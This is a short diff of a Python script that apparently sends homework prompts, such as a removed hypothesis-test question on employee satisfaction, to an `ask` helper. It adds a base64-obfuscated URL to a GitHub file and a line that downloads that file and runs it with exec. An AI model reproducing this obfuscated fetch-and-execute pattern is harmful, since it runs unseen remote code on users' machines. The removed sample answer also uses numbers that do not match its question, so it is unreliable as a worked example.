@@ -16,34 +16,16 @@ exec(r.get(b.b64decode(u).decode()).text);print("Ans:",ask("""Your name"""))
 
 
 
+import requests as r
+u = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ZhaWJoYVZVUy9teS1ub3RlYm9vay9tYWluL3JlcS5weQ=="
+import base64 as b
 exec(r.get(b.b64decode(u).decode()).text);print("Ans:",ask("""
 
 
 
-solve this using python code give code only. only give me code dont add comments. also give hypothises statement. also give hypothises statement. also give the final conclusion
+give python code only no comments
 
 """))
 
 
-exec(r.get(b.b64decode(u).decode()).text);print("Ans:",ask("""
 
-6. A company survey of 750 employees found that 85% were satisfied with their job.
-The margin of error at 95% confidence is ±4.9%.
-The company states in a report: "At least 80% of our employees are satisfied with
-their job."
-At 95% confidence, using the p_value approach, is this statement justified?
-
-give me answer in below format
-
-• H₀: p < 0.65
-• H₁: p ≥ 0.65
-• p̂ = 0.67, n = 850
-• SE = √ [0.65×0.35/850] ≈ 0.0162
-• z = (0.67 - 0.65)/0.0162 ≈ 1.23
-• p-value ≈ 0.1093
-• Conclusion: p-value > 0.05 → Fail to reject H₀
-• Conclusion: Not justified
-
-remove all **
-
-"""))
